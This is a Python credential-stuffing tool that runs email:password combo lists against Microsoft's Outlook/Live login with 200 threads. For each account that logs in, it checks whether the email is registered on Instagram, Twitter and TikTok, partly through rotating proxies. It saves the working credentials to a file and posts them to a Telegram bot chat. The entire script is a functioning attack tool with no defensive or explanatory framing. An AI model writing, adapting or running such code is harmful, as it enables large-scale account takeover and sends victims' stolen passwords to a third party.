import requests
import os
from mechanize import Browser
from user_agent import generate_user_agent
from concurrent.futures import ThreadPoolExecutor
import random
class Mes:
    def __init__(mes):
        mes.r1 = 0
        mes.r2 = 0
        mes.r3 = 0
        mes.r4 = 0
        mes.uaid = '5294cb15462e4cdca3e36aacafb140c5'
        mes.opid = 'BBE7479BF4903A57'
        os.system('cls' if os.name == 'net' else 'clear')
        mes.ID = input(" id : ")
        os.system('cls' if os.name == 'net' else 'clear')
        mes.tok = input(" Token : ")
        os.system('cls' if os.name == 'net' else 'clear')
        mes.completed_emails = set() 
        mes.mes_te()
     
    def mes_te(mes):
        try:
            File = input(" File Name : ")
            with open(File,'r') as file:
                combos = file.read().splitlines()
        except FileNotFoundError:
            print('File not found')
            return

        with ThreadPoolExecutor(max_workers=200) as executor:
            futures = [executor.submit(mes.mes_combo, combo) for combo in combos]
            for future in futures:
                future.result()
    def mes_combo(mes, combo):
        os.system('cls' if os.name == 'nt' else 'clear')
        username, password = combo.split(':')
        if username not in mes.completed_emails:
                    try:
                        cookies = {
                          'DIDC': 'ct%3D1715611312%26hashalg%3DSHA256%26bver%3D24%26appid%3DDefault%26da%3D%253CEncryptedData%2520xmlns%253D%2522http://www.w3.org/2001/04/xmlenc%2523%2522%2520Id%253D%2522devicesoftware%2522%2520Type%253D%2522http://www.w3.org/2001/04/xmlenc%2523Element%2522%253E%253CEncryptionMethod%2520Algorithm%253D%2522http://www.w3.org/2001/04/xmlenc%2523tripledes-cbc%2522%253E%253C/EncryptionMethod%253E%253Cds:KeyInfo%2520xmlns:ds%253D%2522http://www.w3.org/2000/09/xmldsig%2523%2522%253E%253Cds:KeyName%253Ehttp://Passport.NET/STS%253C/ds:KeyName%253E%253C/ds:KeyInfo%253E%253CCipherData%253E%253CCipherValue%253EM.C521_BL2.0.D.CihCZ5MeZv07QHpi1oGLUObTjfPJNlAWdmJTerB/aGckGIrDa3JcfeHRy3yCwLwru0YZlBgOHsjMyhNihE0ucZHz%252BjWQscqNU0m1JxoTRFK6mD87gHIyhWe577x/2TqmV8Uhqs/C/jG0gde3wycG/X8O%252Bq4tBj8joLtrEb/947L9gn7llfYxJkqhQIW%252Bk3mh9NDMCBS9kZ7V%252B5TB7dJWlHlzOvsSclRvcDmHY/jExst2pKrCFhy7nLOjLYA39T7Fr7rqv4dfTMcY2425HvhHa1pM4md0eFPALU5udsDhVk3OcbtTpUIoRFa3IvYqqm1UoVe3cFiR58gWXec4ITFuFpJfCEhU97OF%252B%252BooE7XJEyi/RKDa1cLE7xy9V35atGgf5wNbB/RfiJF9xLphKmg8lFQjB5OOYvRkN/bUL2uJwEsx40hQ/F/lcD3ApTns4ARH7KbukXyu%252ByMqI/J/dagTo6LOZQNanGVUPZHqjEmZoTPqWxa4//ZXzSz8s%252BaEsBUFdYdH2%252B7MquuNizk8yGueZxQ%253D%253C/CipherValue%253E%253C/CipherData%253E%253C/EncryptedData%253E%26nonce%3DOwceQRxd1LedkeGWbNBlq3oAw%252BSvtO6K%26hash%3D2Hh5prTG7LIf26nt9%252BEd%252BDC90kEP6p5CKJLTqZyqjUQ%253D%26dd%3D1',
                          'DIDCL': 'ct%3D1715611312%26hashalg%3DSHA256%26bver%3D24%26appid%3DDefault%26da%3D%253CEncryptedData%2520xmlns%253D%2522http://www.w3.org/2001/04/xmlenc%2523%2522%2520Id%253D%2522devicesoftware%2522%2520Type%253D%2522http://www.w3.org/2001/04/xmlenc%2523Element%2522%253E%253CEncryptionMethod%2520Algorithm%253D%2522http://www.w3.org/2001/04/xmlenc%2523tripledes-cbc%2522%253E%253C/EncryptionMethod%253E%253Cds:KeyInfo%2520xmlns:ds%253D%2522http://www.w3.org/2000/09/xmldsig%2523%2522%253E%253Cds:KeyName%253Ehttp://Passport.NET/STS%253C/ds:KeyName%253E%253C/ds:KeyInfo%253E%253CCipherData%253E%253CCipherValue%253EM.C521_BL2.0.D.CihCZ5MeZv07QHpi1oGLUObTjfPJNlAWdmJTerB/aGckGIrDa3JcfeHRy3yCwLwru0YZlBgOHsjMyhNihE0ucZHz%252BjWQscqNU0m1JxoTRFK6mD87gHIyhWe577x/2TqmV8Uhqs/C/jG0gde3wycG/X8O%252Bq4tBj8joLtrEb/947L9gn7llfYxJkqhQIW%252Bk3mh9NDMCBS9kZ7V%252B5TB7dJWlHlzOvsSclRvcDmHY/jExst2pKrCFhy7nLOjLYA39T7Fr7rqv4dfTMcY2425HvhHa1pM4md0eFPALU5udsDhVk3OcbtTpUIoRFa3IvYqqm1UoVe3cFiR58gWXec4ITFuFpJfCEhU97OF%252B%252BooE7XJEyi/RKDa1cLE7xy9V35atGgf5wNbB/RfiJF9xLphKmg8lFQjB5OOYvRkN/bUL2uJwEsx40hQ/F/lcD3ApTns4ARH7KbukXyu%252ByMqI/J/dagTo6LOZQNanGVUPZHqjEmZoTPqWxa4//ZXzSz8s%252BaEsBUFdYdH2%252B7MquuNizk8yGueZxQ%253D%253C/CipherValue%253E%253C/CipherData%253E%253C/EncryptedData%253E%26nonce%3DOwceQRxd1LedkeGWbNBlq3oAw%252BSvtO6K%26hash%3D2Hh5prTG7LIf26nt9%252BEd%252BDC90kEP6p5CKJLTqZyqjUQ%253D%26dd%3D1',
                      'uaid': '5294cb15462e4cdca3e36aacafb140c5',
                      'MSPRequ': 'id=292841&lt=1715611285&co=1',
                      'MSCC': '105.72.130.83-MA',
                      'OParams': '11O.DpkHz1ouyExiwnZ53QLKhRmwtC8m6YSWVYRY8fhHPStIrfg5R6josBqs0kzIigmHv8jCVwRBLnDBGHtDfIvlfEOHaxP*FhkBR*A3d*A6Eu7t!EMkAz0bDFggWbWyDGLCBPS6uN3xHqmq38NSNgpzAxKHkGOrmfqxNz2mdnuIuFtb1wu6i8RBfekn7Tbw5HfzRfSM3WTQdl1RUB3cfMaKD*VF93nYHQiegPFzvedCN5p9lmwoxe157IH5hDcKQq2QG0ljd9nULRQxjfFnRwpqSAfA*nHCREf3aLoDEfYcf8ZZvYpdmbgUhUqnpeo80pAMOfVfAlfYk4n!0Mem167lblo5DtXNnj831sQFouM5XxlRhrj4V5lPOYHISWWEJC*x9xNxdEBt0j!YRi9fz3jYLgVYy14UFYZyJY5wGWLJzc4fvLt!HnZbkEQCLqSFz*IEYRxIuuv0jw4Ld*aVNJCyg6kejd6fma8DLOWCb2N!iMvUAN0EIlxoR3eQKOxjL6dX0w$$',
    'MicrosoftApplicationsTelemetryDeviceId': '0bbef4be-d401-452a-87e1-239bdb5cb946',
    'ai_session': 'NM6SyAS5dP4qKOJx/EUARV|1715611284973|1715611284973',
    'MSFPC': 'GUID=3fc7493806be47fb8f2126ed224b538a&HASH=3fc7&LV=202405&V=4&LU=1715611271403',
    'MSPOK': '$uuid-f699df22-050f-4c98-81ab-4963527b2342$uuid-e6ae5bc5-db4b-467c-af53-945f1bab6117',
}
                        headers = {
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                           'Accept-Language': 'en-US,en;q=0.9',
                           'Cache-Control': 'max-age=0',
                           'Connection': 'keep-alive',
                           'Content-Type': 'application/x-www-form-urlencoded',
                          'DNT': '1',
                          'Origin': 'https://login.live.com',
                          'Referer': 'https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=152&ct=1715611271&rver=7.0.6738.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fcobrandid%3dab0455a0-8d03-46b9-b18b-df2f57b9e44c%26nlp%3d1%26deeplink%3dowa%252f%253frealm%253dhotmail.com%26RpsCsrfState%3dbf2f0edc-6572-6b98-b85d-746987c01495&id=292841&aadredir=1&whr=hotmail.com&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c',
                         'Sec-Fetch-Dest': 'document',
                         'Sec-Fetch-Mode': 'navigate',
                         'Sec-Fetch-Site': 'same-origin',
                         'Sec-Fetch-User': '?1',
                         'Upgrade-Insecure-Requests': '1',
                         'User-Agent':'{}'.format(generate_user_agent()),
                         'X-Edge-Shopping-Flag': '0',
}
                        params = {
                          'cobrandid': 'ab0455a0-8d03-46b9-b18b-df2f57b9e44c',
                         'id': '292841',
                         'contextid': '3997129C59DECFD9',
                         'opid':'{}'.format(mes.opid),
                         'bk': '1715611285',
                         'uaid':'{}'.format(mes.uaid),
                         'pid': '0',
}
                        data = {
                        'ps': '2',
                        'psRNGCDefaultType': '',
                        'psRNGCEntropy': '',
                        'psRNGCSLK': '',
                        'canary': '',
                        'ctx': '',
                        'hpgrequestid': '',
                        'PPFT': '-Dipiss8GhwpKKzYzVDFFjyyGajTP0cm2dmK4t0duHa5xXdEOX05n8S2AhyufXndxPQCzUazlj81NTeAzrWFoDb5MYCiuwNaWYNWrjwRxGhyrjExObB7fYUGVy8m4v5r4QZaLpOUdZVfZEz*!lWXeatBNXQ90sRK3tekkZMifCeEnvKaQaXMSaljNRrMBw0YPipzpOVZCYuKDpcmGG5Ho6QmCCc5QYo0Xf!HI*2O5s5ky',
                        'PPSX': 'Passpor',
                        'NewUser': '1',
                        'FoundMSAs': '',
                        'fspost': '0',
                        'i21': '0',
                        'CookieDisclosure': '0',
                        'IsFidoSupported': '1',
                        'isSignupPost': '0',
                        'isRecoveryAttemptPost': '0',
                        'i13': '0',
                        'login': '{}'.format(username),
                        'loginfmt':'{}'.format(username),
                        'type': '11',
                        'LoginOptions': '3',
                        'lrt': '',
                        'lrtPartition': '',
                        'hisRegion': '',
                        'hisScaleUnit': '',
                        'passwd': '{}'.format(password),
                    }
                        response = requests.post('https://login.live.com/ppsecure/post.srf',params=params, cookies=cookies, headers=headers, data=data).cookies.get_dict()
                        if '__Host-MSAAUTH' in response:
                            MSAAUTH = response['__Host-MSAAUTH']
                            mes.r1 += 1
                            os.system('cls' if os.name == 'net' else 'clear')
                            print(f'''Done : {mes.r1} - Bad : {mes.r2}
username --> {username} 
password --> {password}
''')
                            
                            email = username
                            url='https://www.instagram.com/api/v1/web/accounts/check_email/'
                            headers={
                    'Accept':'*/*',
                    'Accept-Encoding':'gzip, deflate, br',
                    'Accept-Language':'en-US,en;q=0.9,ar;q=0.8',
                    'Content-Length':'38',
                    'Content-Type':'application/x-www-form-urlencoded',
                    'Sec-Ch-Prefers-Color-Scheme':'dark',
                    'Sec-Ch-Ua':'"Not-A.Brand";v="99", "Chromium";v="124"',
                    'Sec-Ch-Ua-Full-Version-List':'"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.1"',
                    'Sec-Ch-Ua-Mobile':'?1',
                    'Sec-Ch-Ua-Model':'"22021211RG"',
                    'Sec-Ch-Ua-Platform':'"Android"',
                    'Sec-Ch-Ua-Platform-Version':'"13.0.0"',
                    'Sec-Fetch-Dest':'empty',
                    'Sec-Fetch-Mode':'cors',
                    'Sec-Fetch-Site':'same-origin',
                    'User-Agent':'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
                    'Viewport-Width':'393',
                    'X-Asbd-Id':'129477',
                    'X-Csrftoken':'uSc1c91qJGdndg6WgSwdic8Z6npY6lgJ',
                    'X-Ig-App-Id':'1217981644879628',
                    'X-Ig-Www-Claim':'hmac.AR11z00N_IbRNGrzU_J3F40kHM4ANWlo_Iwb9V-urNnx3qQw',
                    'X-Instagram-Ajax':'1011900369',
                    'X-Requested-With':'XMLHttpRequest',
                    'ed-with':'XMLHttpRequest',
            }
                            data={
                    'email': email
                    }
                            re = requests.post(url,headers=headers,data=data).text
                            print(re)
                            if 'email_is_taken' in re:                         
                            	text1 = True  
                            else:                                          
                                 text1 = False                   
                                 
                            url = f'https://api.twitter.com/i/users/email_vailable.json?email={email}'
                            
                            headers = {
                            'Accept': '*/*',
                            'Accept-Encoding': 'gzip, deflate, br',
                            'Accept-Language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
                             'Access-Control-Request-Headers': 'authorization,x-client-transaction-id,x-csrf-token,x-guest-token,x-twitter-active-user,x-twitter-client-language',
                             'Access-Control-Request-Method': 'GET',
                             'Origin': 'https://twitter.com',
                             'Referer': 'https://twitter.com/',
                             'Sec-Fetch-Dest': 'empty',
                             'Sec-Fetch-Mode': 'cors',
                             'Sec-Fetch-Site': 'same-site',
                             'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
}
                            res = requests.get(url, headers=headers).json()
                            print(res)
                            if res.get("valid"):
                                   text2 = True
                            else:
                                  text2 = False
                         
                            try:
                            	prox = {"108.162.198.178:80", "5.34.46.94:8080", "31.43.179.134:80", "45.12.31.124:80","45.12.30.152:80", "104.16.25.216:80", "64.227.42.158:80", "104.23.125.117:80","185.238.228.28:80", "195.74.72.111:5678", "185.162.228.163:80", "190.96.97.202:4153"}
                         
                            	proxy=random.choice(prox)    	
                            	proxies = {"https://" : proxy, "http://" : proxy}                            	                    
                            	url='https://www-useast1a.tiktok.com/passport/web/user/check_email_registered?shark_extra=%7B%22aid%22%3A1459%2C%22app_name%22%3A%22Tik_Tok_Login%22%2C%22app_language%22%3A%22en%22%2C%22device_platform%22%3A%22web_mobile%22%2C%22region%22%3A%22SA%22%2C%22os%22%3A'
                            	headers = {'Accept': '*/*','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7','Access-Control-Request-Headers': 'x-mssdk-info,x-tt-passport-csrf-token,x-tt-passport-ttwid-ticket','Access-Control-Request-Method': 'POST','Origin': 'https://www.tiktok.com','Referer': 'https://www.tiktok.com/','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-site','User-Agent':'{}'.format(generate_user_agent())}
                            	data = f"email={email}&aid=1459&language=ar&account_sdk_source=web&region=IQ&%22%2C0%2C0%2C1%2null%2C0%2C5167%5D&gUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&check_TikTik%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22Gli%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&aid=1459&language=ar&account_sdk_source=SA"                         
                            	rr = requests.post(url, headers=headers, data=data,proxies=proxies).text
                            except:
                            	rr = requests.post(url, headers=headers, data=data).text
                            if '":{"is_registered":1' in rr:
                                    text3 = True
                            else:
                                   text3 = False                                                                                      
                            text = f'''
━━━━━━━━━━━                                                                	
|> Username :  {username}
|> Password --> {password}
|> instargam --> {text1} 
|>Twitte --> {text2}
|> TikTok --> {text3}
|> Facbook --> None
 ━━━━━━━━━━━
|> Tool Py : @d_dwu
━━━━━━━━━━━
'''
                            with open('kkc.txt','a') as ff:
                            	ff.write(f'{text}\n')	                                       

                            requests.post(f"https://api.telegram.org/bot{mes.tok}/sendMessage?chat_id={mes.ID}&text=" + str(text))
                            mes.completed_emails.add(username)
                        else:
                            mes.r2 += 1
                            os.system('cls' if os.name == 'net' else 'clear')
                            print(f'''Done : {mes.r1} - Bad : {mes.r2}
username --> {username} 
password --> {password}
cookies --> None ''')
                    except:
                        pass


mes_instance = Mes()